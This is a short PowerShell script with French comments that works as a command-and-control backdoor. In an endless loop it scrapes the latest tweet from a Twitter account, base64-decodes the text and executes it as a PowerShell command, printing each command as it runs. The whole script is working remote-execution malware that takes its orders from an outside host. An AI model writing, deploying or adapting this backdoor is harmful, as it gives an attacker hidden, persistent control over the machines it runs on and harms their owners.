function Get-LastCmd {
    # On utilise un générateur de feed RSS pour simplifier le parsing du flux Twitter
    $Html = (Invoke-WebRequest -Uri "https://twitter.com/S1mpleCC" -UseBasicParsing).RawContent

    # On sélectionne la bonne string et on garde seulement le payload
    $LastCMD = ($Html.Replace("`t","").Replace("`n","").Replace(" ","").Split("<") | ? {$_ -match "class=`"TweetTextSize"} | Select-Object -First 1).Split(">")[1]
    return $LastCMD
}

$PrevCmd = ""

while ($true) {
    $MyCmd = Get-LastCmd
    if ($MyCmd -ne $PrevCmd) {
        $PrevCmd = $MyCmd
        $DecCmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($MyCmd))
        Write-Host "Executing : $($DecCmd)"
        Start-Process "powershell.exe" -ArgumentList "-Command `"$($DecCmd)`"" -NoNewWindow
    }
    else {
        Start-Sleep -Seconds 5
    }
}